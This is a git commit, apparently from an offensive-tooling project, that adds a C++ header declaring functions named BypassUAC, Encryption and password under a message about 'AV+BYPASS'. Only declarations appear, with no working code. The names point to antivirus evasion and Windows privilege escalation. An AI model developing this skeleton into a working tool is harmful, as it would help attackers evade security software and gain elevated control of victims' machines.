6511326cdf5f2fa7cdfee6efb2c53ffabf4b3adc
518651 <69994181+518651@users.noreply.github.com>
2021-11-12 01:21:04 +0800

    Add to AV+BYPASS Modle

---
+++ 0x7E9FB/Un-main.h
@@ -0,0 +1,24 @@
+#include <Windows.h>
+#include <iostream>
+#include <fstream>
+
+using namespace std;
+
+
+
+
+//Bypass.cpp
+int add_double_data(char new_process_path);
+
+int increase(char start_process);
+
+int BypassUAC();
+
+//Encryption
+int Encryption(char process_path);
+
+
+
+
+//Funtions
+string password();
